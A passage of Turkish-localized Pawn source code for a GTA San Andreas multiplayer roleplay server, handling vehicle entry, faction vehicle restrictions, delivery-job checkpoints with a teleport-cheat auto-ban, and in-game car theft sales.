			else if(getradio >= 70 && getradio <= 79) genre = "Halk";
			else if(getradio >= 80 && getradio <= 89) genre = "Ýlhamverici";
			else if(getradio >= 90 && getradio <= 99) genre = "Evrensel";
			else if(getradio >= 100 && getradio <= 109) genre = "Jazz";
			else if(getradio >= 110 && getradio <= 119) genre = "Latin";
			else if(getradio >= 120 && getradio <= 129) genre = "Metal";
			else if(getradio >= 130 && getradio <= 139) genre = "Misc";
			else if(getradio >= 140 && getradio <= 149) genre = "Yeni Yýl";
			else if(getradio >= 150 && getradio <= 159) genre = "Pop";
			else if(getradio >= 160 && getradio <= 169) genre = "Açýk Radyo";
			else if(getradio >= 170 && getradio <= 179) genre = "R&B/Urban";
			else if(getradio >= 180 && getradio <= 189) genre = "Rap";
			else if(getradio >= 190 && getradio <= 199) genre = "Reggae";
			else if(getradio >= 200 && getradio <= 209) genre = "Rock";
			else if(getradio >= 210 && getradio <= 219) genre = "Sohbet";

			new string[128];
			format(string, sizeof(string), "{00ECFF}Araç Radyo Ýstasyonu:{FFFFFF} %s - {00ECFF}Tür:{FFFFFF} %s {00ECFF} (/radyoac)", VehicleRadioListing[getradio][radioname], genre);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}

   		new
			newcar = GetPlayerVehicleID(playerid),
			v;

        gLastCar[playerid] = newcar;

   	    if(GetPVarInt(playerid, "ToBeEjected") >= 1)
    	{
	       	SetPVarInt(playerid, "ToBeEjected", 0);
	       	RemovePlayerFromVehicle(playerid);
	       	new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			SetPlayerPos(playerid, X, Y, Z+2);

			if(GetPVarInt(playerid, "Injured") == 1)
  			{
  			    Streamer_UpdateEx(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
		   		SetPlayerPos(playerid, GetPVarFloat(playerid,"MedicX"), GetPVarFloat(playerid,"MedicY"), GetPVarFloat(playerid,"MedicZ"));
				SetPlayerVirtualWorld(playerid, GetPVarInt(playerid,"MedicVW"));
				SetPlayerInterior(playerid, GetPVarInt(playerid,"MedicInt"));
   				ClearAnimations(playerid, 1);
				ApplyAnimation(playerid, "KNIFE", "KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0, 1);
   			}
   		}

   		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
  		if(GetCarDealershipVehicleId(newcar) != -1 && GetCarDealershipVehicleId(newcar) == GetPVarInt(playerid, "editingcdveh")) return 1;
        if(GetCarDealershipVehicleId(newcar) != -1)
        {
			new string[57 + 20 + 4];
			format(string, sizeof(string),"Bu %s model aracý almak ister misin?\n\nBu aracýn fiyatý $%d.", GetVehicleName(newcar), CarDealershipInfo[GetCarDealershipId(newcar)][cdVehicleCost][GetCarDealershipVehicleId(newcar)]);
		    ShowPlayerDialogEx(playerid,DIALOG_CDBUY,DIALOG_STYLE_MSGBOX,"Uyarý:",string,"Satýn Al","Iptal");
		    TogglePlayerControllable(playerid, false);
		    return 1;
        }

 		foreach(Player, i)
	 	{
			v = GetPlayerVehicle(i, newcar);
			if(v != -1) {
				if(i == playerid) {

					new
						string[96];

					format(string, sizeof(string),"Bu %s model aracýn sahibisin.", GetVehicleName(newcar));
					SendClientMessage(playerid, COLOR_GREY, string);
					if(PlayerVehicleInfo[i][v][pvTicket] != 0)
					{
						format(string, sizeof(string),"Aracýna LSPD memurlarý tarafýndan $%d'lýk bir ceza býrakýlmýþ. Dillimore'deki DMV'den bu cezayý ödemek zorundasýn.", PlayerVehicleInfo[i][v][pvTicket]);
						SendClientMessage(playerid, COLOR_GREY, string);
						SendClientMessage(playerid, COLOR_GREY, "Bu cezayý ödemezsen aracýn baðlanabilir, hatta hapse bile girebilirsin.");
					}
				}
				else if(i == PlayerInfo[playerid][pVehicleKeysFrom]) {

					new
						string[64 + MAX_PLAYER_NAME];

					format(string, sizeof(string),"Modeli % olan bu aracýn anahtarlarýna sahipsin. Sahibi: %s", GetVehicleName(newcar), GetPlayerNameEx(i));
					SendClientMessage(playerid, COLOR_GREY, string);
				}
				else if(PlayerVehicleInfo[i][v][pvLocked] == 1 && PlayerVehicleInfo[i][v][pvLock] == 1) {
				    GetVehicleParamsEx(newcar,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(newcar,engine,lights,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
					SetTimerEx("DisableVehicleAlarm", 20000, 0, "d",  newcar);
				}
				/*else if(PlayerVehicleInfo[i][v][pvLocked] == 1 && PlayerVehicleInfo[i][v][pvLock] == 2) {

					new
						string[49 + MAX_PLAYER_NAME];

	          		if(PlayerInfo[playerid][pAdmin] < 2)
					{
						format(string, sizeof(string), "* %s has been stunned by the electric anti-theft.",GetPlayerNameEx(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						new Float:X, Float:Y, Float:Z, Float:HP;
	     				GetPlayerPos(playerid, X, Y, Z);
						//SendAudioToRange(64, 100, X, Y, Z, 20.0);
	     				SetPlayerPos(playerid, X + 1, Y, Z);
	         			RemovePlayerFromVehicle(playerid);
	         			SetPVarInt(playerid, "IsFrozen", 1);
	            		TogglePlayerControllable(playerid,0);
		            	SetTimerEx("ReleasePlayer", 10000, 0, "d", playerid);
			            GameTextForPlayer(playerid,"~r~STUNNED!",11000,3);
			            GetPlayerHealth(playerid,HP);
			            SetPlayerHealth(playerid,HP-15);
					}
					else
					{
	    				format(string, sizeof(string), "Warning: This %s is owned by %s.", GetVehicleName(newcar), GetPlayerNameEx(i));
	      				SendClientMessage(playerid, COLOR_GREY, string);
					}
				}*/
				return 1;
			}
		}

		for(new f = 0; f < MAX_FAMILY; f++) {
			v = GetGangVehicle(f, newcar);
			if(v != -1) {
				new string[49 + MAX_PLAYER_NAME];
				if(PlayerInfo[playerid][pGang] == f)
				{
					format(string, sizeof(string), "%s model aracýn sahibi olan ailedensin.", GetVehicleName(newcar));
	    			SendClientMessage(playerid, COLOR_GREY, string);
				}
				else if(FamilyVehicleInfo[f][v][fvLocked] == 1 && FamilyVehicleInfo[f][v][fvLock] == 1)
				{
					GetVehicleParamsEx(newcar,engine,lights,alarm,doors,bonnet,boot,objective);
					SetVehicleParamsEx(newcar,engine,lights,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
					SetTimerEx("DisableVehicleAlarm", 20000, 0, "d",  newcar);
				}
				/*else if(FamilyVehicleInfo[f][v][fvLocked] == 1 && FamilyVehicleInfo[f][v][fvLock] == 2)
				{
		            format(string, sizeof(string), "* %s has been stunned by the electric anti-theft.",GetPlayerNameEx(playerid));
		            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		            new Float:X, Float:Y, Float:Z, Float:HP;
		            GetPlayerPos(playerid, X, Y, Z);
					//SendAudioToRange(64, 100, X, Y, Z, 20.0);
		            SetPlayerPos(playerid, X + 1, Y, Z);
		            RemovePlayerFromVehicle(playerid);
		            new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
					SetPVarInt(playerid, "IsFrozen", 1);
		            TogglePlayerControllable(playerid,0);
		            SetTimerEx("ReleasePlayer", 10000, 0, "d", playerid);
		            GameTextForPlayer(playerid,"~r~STUNNED!",11000,3);
		            GetPlayerHealth(playerid,HP);
		            SetPlayerHealth(playerid,HP-15);
				}*/
				return 1;
			}
		}

		new vehicleid = GetPlayerVehicleID(playerid);

	 	if(IsACopCar(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 1||PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
			{
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "LSPD'den deðilsin!");
			}
		}
		else if(IsAFBICar(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 2||PlayerInfo[playerid][pLeader] == 2)
			{
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "FBI'dan deðilsin.");
			}
		}
		else if(vehicleid == LSFMDVehicles[12] || vehicleid == LSFMDVehicles[33] || vehicleid == LSFMDVehicles[34] || vehicleid == LSFMDVehicles[35]) {
		    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 3) { }
			else {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "Yangýn Departmaný biriminde deðilsin.");
			}
		}
		else if(vehicleid == LSFMDVehicles[13] || vehicleid == LSFMDVehicles[16] || vehicleid == LSFMDVehicles[36] || vehicleid == LSFMDVehicles[37] || vehicleid == LSFMDVehicles[38] || vehicleid == LSFMDVehicles[39] || vehicleid == LSFMDVehicles[40]) {
		    if(PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) { }
			else {
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "Hayat uçuþu biriminde deðilsin.");
			}
		}
		else if(IsANewsVeh(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 9||PlayerInfo[playerid][pLeader] == 9)
			{
				if(GetVehicleModel(vehicleid) == 488 && PlayerInfo[playerid][pRank] < 3) {
				    RemovePlayerFromVehicle(playerid);
				    new Float:slx, Float:sly, Float:slz;
					GetPlayerPos(playerid, slx, sly, slz);
					SetPlayerPos(playerid, slx, sly, slz);
				    NOPCheck(playerid);
				    SendClientMessage(playerid, COLOR_GRAD2, "Bu helikopteri uçurabilmek için en az R3 olman gerek.");
				}
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "San Andreas Haberleri oluþumunda deðilsin!");
			}
		}
		else if(IsAGovCar(vehicleid))
		{
		    if(PlayerInfo[playerid][pFaction] == 5||PlayerInfo[playerid][pLeader] == 5)
			{
			}
		    else
			{
			    RemovePlayerFromVehicle(playerid);
			    new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
			    NOPCheck(playerid);
			    SendClientMessage(playerid, COLOR_GRAD2, "SAD'dan deðilsin.");
			}
		}
 		else if(IsAPlane(vehicleid))
		{
	  		if(PlayerInfo[playerid][pFlyLic] != 1)
	  		{
		  		RemovePlayerFromVehicle(playerid);
		  		new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		  		NOPCheck(playerid);
			 	SendClientMessage(playerid,COLOR_GREY,"Pilot belgen yok!");
	  		}
		}
		else if(IsAHelicopter(vehicleid))
		{
		    PlayerInfo[playerid][pAGuns][GetWeaponSlot(46)] = 46;
			GivePlayerValidWeapon(playerid, 46, 60000);
		}
		else if(IsAnCekici(vehicleid))
		{
	        if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
			{
			}
		    else
			{
		        SendClientMessage(playerid,COLOR_GREY,"Tamirci deðilsin!");
		        RemovePlayerFromVehicle(playerid);
		        new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		    }
		}
		else if(IsAnTaxi(vehicleid) || IsAnBus(vehicleid))
		{
	        if(PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pLeader] == 6)
			{
			}
		    else
			{
		        SendClientMessage(playerid,COLOR_GREY,"Los Santos Taxi oluþumunda deðilsin!");
		        RemovePlayerFromVehicle(playerid);
		        new Float:slx, Float:sly, Float:slz;
				GetPlayerPos(playerid, slx, sly, slz);
				SetPlayerPos(playerid, slx, sly, slz);
		    }
		}
 		if((engine == VEHICLE_PARAMS_UNSET || engine == VEHICLE_PARAMS_OFF) && GetVehicleModel(newcar) != 509 && GetVehicleModel(newcar) != 481 && GetVehicleModel(newcar) != 510) {
			SendClientMessageEx(playerid, COLOR_WHITE, "{FFFFFF}Aracýnýzýn motorunu çalýþtýrmak yada durdurmak için {38B0DE}N{FFFFFF} tuþuna basýn.");
			if(GetPVarInt(playerid, "fuelonoff") == 1)
			{
			    HideProgressBarForPlayer(playerid, FuelBar[playerid]);
				SetPVarInt(playerid, "fuelonoff", 0);
				DestroyProgressBar(FuelBar[playerid]);
				FuelBar[playerid] = INVALID_BAR_ID;
			}
		}
		else
		{
			if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 481 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 509 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 510)
			{
				SetPVarInt(playerid, "fuelonoff", 1);
	 			FuelBar[playerid] = CreateProgressBar( 374, 404, 113.0, 6.2, 866792447, 100.0);
	  			SetProgressBarValue(FuelBar[playerid], Fuel[GetPlayerVehicleID(playerid)]);
				ShowProgressBarForPlayer(playerid, FuelBar[playerid]);
			}
		}
	}
	if(newstate == PLAYER_STATE_SPAWNED)
	{
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		//gPlayerSpawned[playerid] = 1;
	}
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
	if(GetPVarInt(playerid,"TrackCar") != 0)
	{
	    PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
	    DisablePlayerCheckpoint(playerid);
		DeletePVar(playerid, "TrackCar");
		return 1;
	}
	if(GetPVarInt(playerid, "TruckDeliver") > 0 && gPlayerCheckpointStatus[playerid] != CHECKPOINT_RETURNTRUCK)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "Kamyonun içinde deðilsin.");
	        return 1;
	    }
	    if(TruckUsed[playerid] != INVALID_VEHICLE_ID && vehicleid != TruckUsed[playerid])
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "Bu kamyon, teslimatý yapman gereken eþyalar olan kamyon deðil.");
	        return 1;
	    }

		if(!IsAtTruckDeliveryPoint(playerid))
 		{// In the case the player finds a way to exploit the checkpoint to different location
			CancelTruckDelivery(playerid);
			SendClientMessage(playerid, COLOR_REALRED, "Hata: Yanlýþ checkpointe gittin. Teslimat tamamen iptal edildi.");
			return 1;
   		}

		if(GetPVarInt(playerid, "tpTruckRunTimer") != 0) {
  			new string[128];
			format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) adlý oyuncu muhtemelen  teleport hilesi ile kamyonculuk yapýyor.", GetPlayerNameEx(playerid), playerid);
  			ABroadCast(COLOR_YELLOW, string, 2);

  			format(string, sizeof(string), "%s muhtemelen teleport hilesi ile kamyonculuk yapýyor.", GetPlayerNameEx(playerid));
  			AddAutomatedFlag(playerid, string);

			SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  			if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  			{
   				format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid));
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid), playerip);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", string);
   				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
			return 1;
		}

		new truckdeliver = GetPVarInt(playerid, "TruckDeliver");
		TruckContents[vehicleid] = 0;

		if(truckdeliver >= 1 && truckdeliver <= 3)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Yiyecek & Ýçecek teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		else if(truckdeliver >= 4 && truckdeliver <= 6)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kýyafet teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		else if(truckdeliver == 7)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Materyal teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		else if(truckdeliver >= 8 && truckdeliver <= 10)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Market malzemeleri teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		else if(truckdeliver >= 11 && truckdeliver <= 15)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		else if(truckdeliver >= 16 && truckdeliver <= 20)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		else if(truckdeliver >= 21 && truckdeliver <= 25)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýllegal materyal teslimatý yaptýn, ödemeni almak için Ocean Docks'a geri dön.");
		}
		DisablePlayerCheckpoint(playerid);

		gPlayerCheckpointStatus[playerid] = CHECKPOINT_RETURNTRUCK;
		SetPlayerCheckpoint(playerid, 2225.343261, -2635.977294, 13.438463, 5);
		GameTextForPlayer(playerid, "~w~Gecis Noktasi Ayarlandi ~r~Ocean Docks", 5000, 1);
		SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Ocean Docks'a geri dön (haritadaki kýrmýzý nokta).");

		SetPVarInt(playerid, "tpTruckRunTimer", 30);
		SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPTRUCKRUNTIMER);
		return 1;
	}
    else if(GetPVarInt(playerid, "Pizza") > 0 && IsPlayerInRangeOfPoint(playerid, 5.0, HouseInfo[GetPVarInt(playerid, "Pizza")][hExteriorX], HouseInfo[GetPVarInt(playerid, "Pizza")][hExteriorY], HouseInfo[GetPVarInt(playerid, "Pizza")][hExteriorZ]))
	{
	    new string[128];
		if(GetPVarInt(playerid, "tpPizzaTimer") != 0)
		{
			format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) adlý kiþi muhtemelen teleport hilesi ile pizzacýlýk yapýyor.", GetPlayerNameEx(playerid), playerid);
  			ABroadCast(COLOR_YELLOW, string, 2);

  			format(string, sizeof(string), "%s muhtemelen teleport hilesi ile pizzacýlýk yapýyor.", GetPlayerNameEx(playerid));
  			AddAutomatedFlag(playerid, string);

    		// format(string, sizeof(string), "%s (ID %d) is possibly teleport pizzarunning.", GetPlayerNameEx(playerid), playerid);
	    	// Log("logs/hack.log", string);
	    	format(string, sizeof(string), "Pizzayý soðumadan hedefe götürdün vee $%d kazandýn.", (GetPVarInt(playerid, "pizzaTimer") * 2));
	    	SendClientMessage(playerid, COLOR_WHITE, string);
   			SetPVarInt(playerid, "Pizza", 0);
			DisablePlayerCheckpoint(playerid);

			SetPVarInt(playerid, "_TP_HACK_WARNINGS", GetPVarInt(playerid,"_TP_HACK_WARNINGS")+1);

  			if(GetPVarInt(playerid,"_TP_HACK_WARNINGS") >= 3)
  			{
   				format(string, sizeof(string), "AdminKomutu: %s adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid));
				SendClientMessageToAllEx(COLOR_LIGHTRED, string);
				PlayerInfo[playerid][pBanned] = 3;
				new playerip[32];
				GetPlayerIp(playerid, playerip, sizeof(playerip));
				format(string, sizeof(string), "AdminKomutu: %s (IP:%s) adlý oyuncu banlandý, sebep: Teleport Hilesi.", GetPlayerNameEx(playerid), playerip);
				PlayerInfo[playerid][pBanned] = 3;
				Log("logs/ban.log", string);
   				new ip[32];
				GetPlayerIp(playerid,ip,sizeof(ip));
				AddBan(ip);
				Kick(playerid);
				TotalAutoBan++;
			}
	    	return 1;
		}
		DestroyProgressBar(PizzaBar[playerid]);
		format(string, sizeof(string), "Pizzayý soðumadan hedefe götürdün vee $%d kazandýn.", (GetPVarInt(playerid, "pizzaTimer") * 2));
		//Tax -= (GetPVarInt(playerid, "pizzaTimer") * 70);
		//Misc_Save();
		GivePlayerCash(playerid, floatround((GetPVarInt(playerid, "pizzaTimer") * 2), floatround_round));
		SendClientMessage(playerid, COLOR_WHITE, string);
		SetPVarInt(playerid, "Pizza", 0);
		DisablePlayerCheckpoint(playerid);

	}
	else if(FindingJob[playerid] != 0)
	{
		switch (FindingJob[playerid])
		{
		    case 1: SendClientMessage(playerid, COLOR_WHITE, "Dedektiflik mesleði bu binanýn içerisinde. Ýçeri girmek için /gir yaz.");
		    case 2: SendClientMessage(playerid, COLOR_WHITE, "Avukat mesleðine geldin. /isegir yazarak iþe gir.");
		    case 3: SendClientMessage(playerid, COLOR_WHITE, "Hayat kadýný mesleði bu binanýn içerisinde. Ýçeri girmek için /gir yaz.");
		    case 4: SendClientMessage(playerid, COLOR_WHITE, "Uyuþturucu satýcýsý mesleðine geldin. /isegir yazarak iþe gir.");
		    case 5: SendClientMessage(playerid, COLOR_WHITE, "Tamirci mesleðine geldin. /isegir yazarak iþe gir.");
		    case 6: SendClientMessage(playerid, COLOR_WHITE, "Bodyguard mesleðine geldin. /isegir yazarak iþe gir.");
		    case 7: SendClientMessage(playerid, COLOR_WHITE, "Silahçý mesleðine geldin. /isegir yazarak iþe gir.");
		    case 8: SendClientMessage(playerid, COLOR_WHITE, "Boksör mesleði bu binanýn içerisinde. Ýçeri girmek için /gir yaz.");
		    case 9: SendClientMessage(playerid, COLOR_WHITE, "Uyuþturucu kaçakçýsý mesleðine geldin. /isegir yazarak iþe gir.");
      		case 10: SendClientMessage(playerid, COLOR_WHITE, "Taksici mesleðine geldin. /isegir yazarak iþe  gir.");
		    case 11: SendClientMessage(playerid, COLOR_WHITE, "Zanaatkar mesleðine geldin. /isegir yazarak iþe gir.");
		    case 12: SendClientMessage(playerid, COLOR_WHITE, "Barmen mesleði bu binanýn içerisinde. Ýçeri girmek için /gir yaz.");
		    case 13: SendClientMessage(playerid, COLOR_WHITE, "Kamyoncu mesleðine geldin. /isegir yazarak iþe gir.");
		    case 14: SendClientMessage(playerid, COLOR_WHITE, "Pizzacý mesleði bu binanýn içerisinde. Ýçeri girmek için /gir yaz.");
		    case 15: SendClientMessage(playerid, COLOR_WHITE, "Balýkçýlarýn mesleðine geldin.Ýskelede yada bir bottayken /baliktut komutuyla balýk tutabilirsin.");
		}
		DisablePlayerCheckpoint(playerid);
		FindingJob[playerid] = 0;
	}
	else if(FindingDealership[playerid] != 0)
	{
		DisablePlayerCheckpoint(playerid);
		FindingDealership[playerid] = 0;
	}
	else if(CP[playerid] == 1)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
		    new
				vehicleid = GetPlayerVehicleID(playerid);

  			foreach(Player, i)
			{
                new v = GetPlayerVehicle(i, vehicleid);
                if(v != -1)
				{
    				CP[playerid] = 0;
    				DisablePlayerCheckpoint(playerid);
					GameTextForPlayer(playerid, "~r~Arac reddedildi", 5000, 1);
					SendClientMessage(playerid, COLOR_WHITE, "Bir oyuncuya yada aileye ait aracý satamazsýn.");
                    return 1;
                }
            }
            for(new f = 0; f < MAX_FAMILY; f++)
			{
                new v = GetGangVehicle(f, vehicleid);
                if(v != -1)
                {
					CP[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
					GameTextForPlayer(playerid, "~r~Arac reddedildi", 5000, 1);
					SendClientMessage(playerid, COLOR_WHITE, "Bir oyuncuya yada aileye ait aracý satamazsýn.");
                    return 1;
                }
			}

			new string[128];

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pCarSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pCarSkill]++;
				}
			#else
				PlayerInfo[playerid][pCarSkill] ++;
			#endif

			new mypoint = -1;
			for (new i=0; i<MAX_POINTS; i++)
			{
				if(strcmp(Points[i][Name], "Auto Export Company", true) == 0)
				{
					mypoint = i;
				}
			}
			if(PlayerInfo[playerid][pCarSkill] == 50)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Araç Hýrsýzý yetenek levelin 2 oldu, artýk daha hýzlý araç satarak daha hýzlý para kazanacaksýn."); }
			else if(PlayerInfo[playerid][pCarSkill] == 100)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Araç Hýrsýzý yetenek levelin 3 oldu, artýk daha hýzlý araç satarak daha hýzlý para kazanacaksýn."); }
			else if(PlayerInfo[playerid][pCarSkill] == 200)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Araç Hýrsýzý yetenek levelin 4 oldu, artýk daha hýzlý araç satarak daha hýzlý para kazanacaksýn."); }
			else if(PlayerInfo[playerid][pCarSkill] == 400)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Araç Hýrsýzý yetenek levelin 5 oldu, artýk daha hýzlý araç satarak daha hýzlý para kazanacaksýn."); }
			new level = PlayerInfo[playerid][pCarSkill];
			if(level >= 0 && level < 50)
			{
				new rand = random(sizeof(SELLCAR1));
				format(string, sizeof(string), "Aracý $%d'a sattýn. Tekrar satabilmek için 20 dakika beklemen gerek.", SELLCAR1[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR1[rand]);
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				PlayerInfo[playerid][pCarTime] = 1200;
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR1[rand]/2);
					}
				}
			}
			else if(level >= 50 && level < 100)
			{
				new rand = random(sizeof(SELLCAR2));
				format(string, sizeof(string), "Aracý $%d'a sattýn. Tekrar satabilmek için 18 dakika beklemen gerek.", SELLCAR2[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR2[rand]);
				PlayerInfo[playerid][pCarTime] = 1080;
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR2[rand]/2);
					}
				}
			}
			else if(level >= 100 && level < 200)
			{
				new rand = random(sizeof(SELLCAR3));
				format(string, sizeof(string), "Aracý $%d'a sattýn. Tekrar satabilmek için 16 dakika beklemen gerek.", SELLCAR3[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR3[rand]);
				PlayerInfo[playerid][pCarTime] = 960;
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR3[rand]/2);
					}
				}
			}
			else if(level >= 200 && level < 400)
			{
				new rand = random(sizeof(SELLCAR4));
				format(string, sizeof(string), "Aracý $%d'a sattýn. Tekrar satabilmek için 14 dakika beklemen gerek.", SELLCAR4[rand]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, SELLCAR4[rand]);
				PlayerInfo[playerid][pCarTime] = 840;
				CP[playerid] = 0;
				DisablePlayerCheckpoint(playerid);
				SetVehicleToRespawn(vehicleid);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+(SELLCAR4[rand]/2);
					}
				}
			}
			else if(level >= 400)
			{
				new money = 600;
